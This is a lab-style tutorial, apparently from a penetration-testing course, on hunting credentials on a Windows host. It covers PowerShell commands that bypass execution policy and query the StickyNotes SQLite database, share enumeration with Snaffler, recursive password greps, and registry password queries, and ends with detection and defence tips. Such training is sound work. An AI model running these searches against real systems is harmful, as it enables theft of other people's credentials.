# 🛰️ Windows Credential Hunting Guide

## 🔍 Introduction
[!ABSTRACT] This guide outlines advanced methods for searching and extracting credentials from various locations on a Windows system, focusing on StickyNotes SQLite databases, network shares, backup files, and more.

---

## ⚙️ Setup & Prerequisites

### Connect to Target Host
```bash
# Use xfreerdp to connect to the target host with provided credentials
xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

# Expected output:
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

### Load PSSQLite Tools
```powershell
# Open PowerShell and navigate to the PSSQLite tools directory
cd C:\Tools\PSSQLite\
```
[!NOTE] Ensure you have permissions to access and execute scripts in this directory.

### Set Execution Policy for PowerShell
```powershell
# Bypass execution policy for the current process only
Set-ExecutionPolicy Bypass -scope Process

# Expected output:
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to security risks.

Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
[!SUCCESS] Response: `A` (Yes to All)

### Import PSSQLite Module
```powershell
# Import the PSSQLite module and handle security prompts
Import-Module .\PSSQLite.psd1

# Expected security warning:
Security warning
Run only scripts that you trust. Changing execution policy might expose you to risks.

Do you want to run C:\Tools\PSSQLite\PSSQLite.psm1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
```
[!SUCCESS] Response: `R` (Run Once)

---

## 📝 StickyNotes Database Analysis

### Locate SQLite Database
```powershell
# Set the path to the SQLite database for StickyNotes
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

### Query Notes Table
```powershell
# Query the Note table and display results
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Expected output:
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
...
\id=c73f29c3-64f8-4cfc-9421-f65c34b4c00e [bob_adm password should be here]
```
[!EXAMPLE] Look for lines containing `password`, `credential`, or specific usernames like `bob_adm`.

---

## ⛓️ Network Share Drive Hunting

### Enumerate Shares
```cmd
# Common network share credential hunting commands
net view \\10.129.43.44
dir \\10.129.43.44\users\*
dir \\10.129.43.44\shared\*

# Automated tool for share enumeration
Snaffler.exe -s 10.129.43.44 -d HTB_ACADEMY
```

### Common Share Locations
```cmd
# Typical paths to search for credentials
\\<server>\users\<username>                       # Personal folders
\\<server>\shared\IT                             # IT department files
\\<server>\applications\configs                 # Application configurations
\\<server>\backup                                # Backup files
\\<server>\temp                                  # Temporary files
```

---

## 🔍 Advanced Search Techniques

### Recursive Pattern Matching
```powershell
# PowerShell search for patterns across the file system
Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | 
ForEach-Object { 
    Select-String -Pattern "password|credential|admin" -InputObject $_.FullName -ErrorAction SilentlyContinue 
} | Select-Object Filename, LineNumber, Line

# Example output:
Filename             LineNumber   Line
--------             ----------   ----
C:\users\htb-student\txt\credentials.txt 1 password=Vc3nt3R_adm1n!
```
[!EXAMPLE] Use patterns like `password`, `credential`, and specific usernames to narrow down search results.

### Binary Files & Databases
```cmd
# Extract strings from binary files for potential passwords or credentials
strings.exe <binary_file> | findstr /i password

# Example output:
password=Thycotic_demo@1234567890

# Search the Windows registry for stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
[!WARNING] Ensure you understand the potential impact of querying the registry and accessing sensitive files.

---

## ⚠️ Detection & Defense

### Common Indicators of Credential Hunting Activities
```cmd
# Monitor for:
- Bulk file access patterns
- SQLite database queries on StickyNotes files
- Registry searches for credential patterns
- Network share enumeration activities
- Access to system backup files
```

### Defensive Measures
```cmd
# Security practices:
- Regular cleanup of backup files
- Secure storage of SQLite databases
- Monitor and audit access to sensitive file locations
- Implement file integrity monitoring
- Educate users on secure password management
- Review network share permissions regularly
```
[!INFO] Implementing these measures can significantly reduce the risk of credential theft.

---

## 💡 Key Takeaways

1. **StickyNotes databases** often contain plaintext credentials.
2. **System backup files** may hold sensitive registry copies with credentials.
3. **Network shares** frequently store documents containing valuable information.
4. **Manual searching** complements automated enumeration tools effectively.
5. **Multiple file types** should be examined systematically for comprehensive coverage.
6. **PowerShell provides powerful** search capabilities for credential hunting.

---